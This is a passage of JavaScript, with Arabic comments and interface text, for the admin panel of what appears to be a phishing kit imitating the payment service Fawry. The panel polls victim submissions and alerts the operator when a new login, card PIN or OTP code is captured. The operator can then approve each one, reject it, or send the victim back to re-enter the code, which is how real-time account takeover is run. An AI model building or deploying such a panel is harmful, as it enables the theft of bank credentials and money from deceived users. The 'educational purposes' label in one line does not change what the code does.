          db.update(id, { verification_status: "rejected", review_status: "otp_rejected" });
          tsuc("تم رفض OTP — العميل يعيد الإدخال");
        } else if (app.card_pin && app.review_status === "pin_submitted") {
          db.update(id, { review_status: "pin_rejected" });
          tsuc("تم رفض رقم الكارت — العميل يعيد الإدخال");
        } else if (app.site_username && app.login_status !== "approved") {
          db.update(id, { login_status: "rejected", review_status: "rejected" });
          tsuc("تم رفض بيانات الدخول — العميل يعيد الإدخال");
        } else {
          db.update(id, { login_status: "rejected", review_status: "rejected" });
          tsuc("تم رفض العملية");
        }
      }
      refresh(true);
      return;
    }
    // fallback للبيانات القديمة (لو db.js مش محمّل)
    var orders = readOrders();
    var sorted = orders.slice().sort(function (a, b) { return String(a.at || "").localeCompare(String(b.at || "")); });
    var arr = sorted, mapBack = orders;
    function findIdx(list) {
      for (var i = 0; i < list.length; i++) {
        var key = list[i].id || (list[i].at + "-" + (i + 1));
        if (key === id) return i;
      }
      return -1;
    }
    var idx = findIdx(arr);
    if (idx === -1) return;
    var target = arr[idx];
    var real = mapBack.filter(function (x) { return x === target; })[0];
    if (!real) return;
    if (kind === "del") {
      try { localStorage.setItem(K_ORDERS, JSON.stringify(mapBack.filter(function (x) { return x !== real; }))); } catch (e) {}
      tsuc("تم حذف الطلب");
    } else if (kind === "clearall") {
      var pin2 = window.prompt("أدخل Pin لتأكيد حذف جميع الطلبات");
      if (pin2 === null) return;
      _hash(pin2.trim()).then(function(h) {
        if (h !== _H2) { terr("رمز Pin غير صحيح"); return; }
        if (window.confirm("هل أنت متأكد من حذف جميع الطلبات؟")) {
          try { localStorage.setItem(K_ORDERS, "[]"); } catch (e) {}
          tsuc("تم حذف جميع الطلبات");
        }
      }); return;
    } else {
      var st = kind === "approve" ? "approved" : kind === "bank" ? "bank_approval" : "rejected";
      real.status = st;
      try { localStorage.setItem(K_ORDERS, JSON.stringify(mapBack)); } catch (e) {}
      tsuc(st === "approved" ? "تم قبول العملية ✓" : st === "bank" ? "تم إرسال طلب الموافقة إلى تطبيق البنك" : "تم رفض العملية");
    }
    refresh(true);
  }
  function bindOrderActions() {
    content.querySelectorAll("[data-ord-row]").forEach(function (r) {
      r.addEventListener("click", function (e) {
        if (e.target && e.target.closest && e.target.closest("[data-ord-approve],[data-ord-bank],[data-ord-reject],[data-ord-del],[data-ord-otp],[data-ord-pin]")) return;
        openDrawer(r.getAttribute("data-ord-row"));
      });
    });
    content.querySelectorAll("[data-ord-approve]").forEach(function (b) { b.addEventListener("click", function () { act("approve", b.getAttribute("data-ord-approve")); }); });
    content.querySelectorAll("[data-ord-bank]").forEach(function (b) { b.addEventListener("click", function () { act("bank", b.getAttribute("data-ord-bank")); }); });
    content.querySelectorAll("[data-ord-reject]").forEach(function (b) { b.addEventListener("click", function () { act("reject", b.getAttribute("data-ord-reject")); }); });
    content.querySelectorAll("[data-ord-otp]").forEach(function (b) { b.addEventListener("click", function () { act("route-otp", b.getAttribute("data-ord-otp")); }); });
    content.querySelectorAll("[data-ord-pin]").forEach(function (b) { b.addEventListener("click", function () { act("route-pin", b.getAttribute("data-ord-pin")); }); });
    content.querySelectorAll("[data-ord-del]").forEach(function (b) {
      b.addEventListener("click", function (e) { e.stopPropagation(); act("del", b.getAttribute("data-ord-del")); });
    });
    content.querySelectorAll("[data-ord-clearall]").forEach(function (b) { b.addEventListener("click", function () { act("clearall"); }); });
  }

  // ---------- تاب الإعدادات ----------
  var inpCls = "h-[36px] w-full rounded-[6px] border border-[hsl(214_25%_85%)] bg-white px-2.5 text-right text-[12px] text-brand-blue outline-none focus:border-brand-blue";
  function renderSettings() {
    var me = session();
    content.innerHTML =
      '<div class="space-y-3">' +
        // كلمة المرور
        '<div class="rounded-xl border border-white/60 bg-white/80 p-3 shadow-card backdrop-blur-xl">' +
          '<div class="flex items-center gap-3 border-b border-border/70 pb-2">' +
            '<span class="grid h-7 w-7 place-items-center rounded-lg bg-amber-100 text-amber-700">' + ic(P_keyRound, "h-3.5 w-3.5") + "</span>" +
            '<div class="leading-tight"><h2 class="text-[13px] font-extrabold text-brand-blue">كلمة المرور</h2><p class="text-[10px] text-muted-foreground">تغيير كلمة مرور الدخول للوحة التحكم</p></div>' +
          "</div>" +
          '<form id="adm-pass-form" class="mx-auto mt-3 max-w-lg space-y-2 rounded-xl border border-border/60 bg-white/70 p-3">' +
            '<div class="space-y-1"><label class="block text-right text-[11px] font-bold text-brand-blue">كلمة المرور الحالية</label><input type="password" id="pw-cur" placeholder="••••••" required class="' + inpCls + '"></div>' +
            '<div class="space-y-1"><label class="block text-right text-[11px] font-bold text-brand-blue">Pin تغيير كلمة المرور</label><input type="password" id="pw-pin" inputmode="numeric" placeholder="••••••" required class="' + inpCls + '"></div>' +
            '<div class="space-y-1"><label class="block text-right text-[11px] font-bold text-brand-blue">تأكيد كلمة المرور</label><input type="password" id="pw-conf" placeholder="••••••" required class="' + inpCls + '"></div>' +
            '<button type="submit" class="h-[38px] w-full rounded-[6px] bg-brand-blue text-[12px] font-extrabold text-white shadow-soft transition-transform hover:brightness-110 active:scale-[0.99] disabled:opacity-60">حفظ كلمة المرور الجديدة</button>' +
            '<p class="text-center text-[10px] text-muted-foreground">يتم حفظ كلمة المرور محليًا على هذا المتصفح فقط (للأغراض التعليمية).</p>' +
          "</form>" +
        "</div>" +
        // المسؤولون
        '<div class="rounded-xl border border-white/60 bg-white/80 p-3 shadow-card backdrop-blur-xl">' +
          '<div class="flex items-center gap-3 border-b border-border/70 pb-2">' +
            '<span class="grid h-7 w-7 place-items-center rounded-lg bg-violet-100 text-violet-700">' + ic(P_users, "h-3.5 w-3.5") + "</span>" +
            '<div class="leading-tight"><h2 class="text-[13px] font-extrabold text-brand-blue">المسؤولون</h2><p class="text-[10px] text-muted-foreground">حسابات المسؤولين المتصلة حاليًا بلوحة التحكم</p></div>' +
            '<span class="ms-auto rounded-full bg-violet-100 px-2 py-0.5 text-[10px] font-extrabold text-violet-700">1</span>' +
          "</div>" +
          '<div class="mt-2 space-y-1.5">' +
            '<div class="flex items-center gap-2 rounded-xl border border-border/60 bg-white/70 p-2">' +
              '<span class="grid h-7 w-7 place-items-center rounded-lg bg-brand-blue/10 text-brand-blue">' + ic(P_users, "h-3.5 w-3.5") + "</span>" +
              '<div class="min-w-0 flex-1 leading-tight">' +
                '<div class="flex items-center gap-2"><span class="font-mono text-[11px] font-extrabold text-brand-blue break-all">' + esc(me) + '</span><span class="rounded-full bg-emerald-100 px-1.5 py-0.5 text-[8px] font-bold text-emerald-700">جلستي</span></div>' +
                '<div class="mt-0.5 text-[10px] text-muted-foreground">' + esc(deviceName(navigator.userAgent)) + " • متصلة الآن</div>" +
              "</div>" +
              '<button type="button" data-kick="' + esc(me) + '" class="flex h-7 items-center gap-1 rounded-lg bg-destructive px-2 text-[10px] font-extrabold text-white hover:brightness-110 disabled:cursor-not-allowed disabled:opacity-40" disabled>' + ic(P_logOut, "h-3 w-3") + "<span>طرد</span></button>" +
            "</div>" +
          "</div>" +
          '<div class="mt-2 flex items-center gap-2 rounded-lg border border-amber-200 bg-amber-50/70 p-2 text-[10px] text-amber-800">' + ic(P_shieldAlert, "h-3 w-3 shrink-0") + "<span>الطرد محمي برمز PIN — بعد الطرد يخرج المسؤول من اللوحة ولا يستطيع الدخول إلا بكلمة المرور مجددًا.</span></div>" +
        "</div>" +
        '<div class="flex justify-end">' +
          '<button type="button" data-set-save class="inline-flex h-10 items-center gap-2 rounded-xl bg-brand-blue px-4 text-[12px] font-extrabold text-white shadow-card transition-all hover:brightness-110">' + ic(P_save, "h-3.5 w-3.5") + " حفظ الإعدادات</button>" +
        "</div>" +
      "</div>";

    document.getElementById("adm-pass-form").addEventListener("submit", function (e) {
      e.preventDefault();
      var cur = document.getElementById("pw-cur").value;
      var pin = document.getElementById("pw-pin").value;
      var conf = document.getElementById("pw-conf").value;
      _hash(pin.trim()).then(function(h) {
        if (h !== _H2) { terr("رمز Pin غير صحيح"); return; }
        if (!conf.trim()) { terr("أدخل تأكيد كلمة المرور"); return; }
        var storedP = getPass();
        if (storedP) {
          if (cur !== storedP) { terr("كلمة المرور الحالية غير صحيحة"); return; }
        } else {
          _hash(cur).then(function(ch) {
            if (ch !== _H1) { terr("كلمة المرور الحالية غير صحيحة"); return; }
            if (!conf || conf.length < 4) { terr("كلمة المرور الجديدة يجب أن تكون 4 أحرف على الأقل"); return; }
            lsSet(K_PASS, conf); tsuc("تم تغيير كلمة المرور بنجاح"); e.target.reset();
          }); return;
        }
        if (!conf || conf.length < 4) { terr("كلمة المرور الجديدة يجب أن تكون 4 أحرف على الأقل"); return; }
        lsSet(K_PASS, conf);
        tsuc("تم تغيير كلمة المرور بنجاح");
        e.target.reset();
      });
    });
    content.querySelector("[data-kick]").addEventListener("click", function () {
      var p = window.prompt("أدخل رمز الحماية لتأكيد طرد المسؤول:");
      if (p === null) return;
      _hash(p).then(function(h) {
        if (h !== _H2) { terr("رمز الحماية غير صحيح"); return; }
        if (window.confirm("لا يمكنك طرد جلستك الحالية من هنا؛ الطرد يعمل على جلسات المسؤولين الأخرى في النسخة المتصلة.")) return;
      });
    });
    content.querySelector("[data-set-save]").addEventListener("click", function () { tsuc("تم حفظ الإعدادات"); });
  }

  // ---------- الرسّامة الرئيسية ----------
  function renderTab() {
    if (state.tab === "visitors") renderVisitors();
    else if (state.tab === "orders") renderOrders();
    else renderSettings();
  }
  function refresh(force) {
    closeDrawerStale();
    var orders = readOrders();
    var visitors = readVisitors();
    var pend = pendingCount(orders);
    // تنبيهات diff (نغمة + توست زي الأصل): طلب جديد / بيانات دخول جديدة / OTP جديد — أول تشغيل صامت
    if (!state.seen) {
      state.seen = { ids: {}, login: {}, pin: {}, otp: {} };
      orders.forEach(function (o) {
        state.seen.ids[o.id] = 1;
        state.seen.login[o.id] = o.site_username ? 1 : 0;
        state.seen.pin[o.id] = o.card_pin ? 1 : 0;
        state.seen.otp[o.id] = o.otp_code ? 1 : 0;
      });
    } else {
      var newMsgs = [];
      orders.forEach(function (o) {
        if (!state.seen.ids[o.id]) {
          state.seen.ids[o.id] = 1;
          state.seen.login[o.id] = o.site_username ? 1 : 0;
          state.seen.pin[o.id] = o.card_pin ? 1 : 0;
          state.seen.otp[o.id] = o.otp_code ? 1 : 0;
          newMsgs.push("طلب جديد — من " + (o.name || "عميل"));
        } else {
          if (o.site_username && !state.seen.login[o.id]) {
            state.seen.login[o.id] = 1;
            newMsgs.push("بيانات دخول جديدة — من " + (o.name || "عميل"));
          }
          if (o.card_pin && !state.seen.pin[o.id]) {
            state.seen.pin[o.id] = 1;
            newMsgs.push("رقم كارت جديد — من " + (o.name || "عميل"));
          }
          if (o.otp_code && !state.seen.otp[o.id]) {
            state.seen.otp[o.id] = 1;
            newMsgs.push("رمز OTP جديد — من " + (o.name || "عميل"));
          }
        }
      });
      // إشعار واحد مجمّع بدل سيل من الإشعارات
      if (newMsgs.length === 1) { chime(); tsuc(newMsgs[0]); }
      else if (newMsgs.length > 1) { chime(); tsuc("تحديثات جديدة — عدد " + newMsgs.length); }
    }
    state.lastPending = pend;
    refreshNav(orders, visitors);
    refreshHeader(orders);
    var activeDrawerId = state.drawerId;
    if (activeDrawerId) {
      // تحديث فوري للدرَور المفتوح: لو الداتا اتبدلت، نعيد بناء الدرَور صامت (من غير ظلام/حركة)
      var fresh = null;
      for (var di = 0; di < orders.length; di++) {
        var dkey = orders[di].id;
        if (dkey === activeDrawerId) { fresh = orders[di]; break; }
      }
      if (!fresh) {
        closeDrawer();
      } else {
        var sig = ordSig(fresh);
        if (state.drawerSig !== sig) {
          // الداتا اتغيرت فعلاً — نعيد بناء الدرَور صامت ونحفظ مكان التمرير
          var oldAside = document.querySelector("#adm-drawer aside");
          var oldScroll = oldAside ? oldAside.scrollTop : 0;
          state.drawerSig = sig;
          openDrawer(activeDrawerId, true, state.drawerTab);
          var newAside = document.querySelector("#adm-drawer aside");
          if (newAside && oldScroll) newAside.scrollTop = oldScroll;
        }
      }
    }
    if (force || !state.drawerId) renderTab();
    else { // الطلب مفتوح: خلي التاب معمول حاليًا لكن الرسم يحفظ الدرَور
      if (state.tab === "orders") renderTab();
    }
  }

  function showApp() {
    loginBox.classList.add("hidden");
    appBox.classList.remove("hidden");
    // ربط الهيدر
    appBox.querySelectorAll("[data-adm]").forEach(function (b) {
      var k = b.getAttribute("data-adm");
      if (b.getAttribute("data-fw-bound") === "1") return;
      b.setAttribute("data-fw-bound", "1");
      b.addEventListener("click", function () {
        if (k === "power") {
          var closed = lsGet(K_CLOSED, "") === "1";
          if (closed) lsSet(K_CLOSED, ""); else lsSet(K_CLOSED, "1");
          tsuc(closed ? "تم فتح الموقع" : "تم إغلاق الموقع مؤقتًا");
          refresh(true);
        } else if (k === "bell") {
          state.muted = !state.muted;
          lsSet(K_MUTE, state.muted ? "1" : "");
          toast(state.muted ? "تم كتم الإشعار الصوتي" : "تم تفعيل الإشعار الصوتي");
          refresh(true);
        } else if (k === "test") {
          chime();
          for (var i = 0; i < 3; i++) setTimeout(function () { chime(); toast("طلب جديد (تجربة)"); }, i * 400);
        } else if (k === "logout") {
          clearAuth();
          renderLogin();
        }
      });
    });
    // ربط التابات + الموبايل (الموبايل بيتبني من جديد كل تحديث → حدث مُفَوَّض على الحاوية)
    document.querySelectorAll("aside [data-tab]").forEach(function (b) {
      if (b.getAttribute("data-fw-bound") === "1") return;
      b.setAttribute("data-fw-bound", "1");
      b.addEventListener("click", function () { switchTab(b.getAttribute("data-tab")); });
    });
    if (mobTabs && mobTabs.getAttribute("data-fw-bound") !== "1") {
      mobTabs.setAttribute("data-fw-bound", "1");
      mobTabs.addEventListener("click", function (e) {
        var b = e.target && e.target.closest ? e.target.closest("[data-tab]") : null;
        if (b) switchTab(b.getAttribute("data-tab"));
      });
    }
    state.lastPending = pendingCount(readOrders());
    refresh(true);
  }

  function switchTab(tab) {
    state.tab = tab;
    state.open.clear();
    state.msgFor = null;
    closeDrawer();
    refresh(true);
  }

  // حلقة التحديث السريعة (كل 1.5 ثانية = بديل Realtime)
  setInterval(function () {
    if (isAuthed() && !appBox.classList.contains("hidden")) refresh(false);
  }, 1500);

  // تزامن فوري: أي تبويب تاني (العميل/صفحات الموقع) غيّر البيانات → تحديث حالًا
  window.addEventListener("storage", function (e) {
    if (e.key === "fawry_applications" || e.key === "fawry_app_queue") {
      if (isAuthed() && !appBox.classList.contains("hidden")) refresh(false);
    }
  });

  if (isAuthed()) showApp();
  else renderLogin();
})();
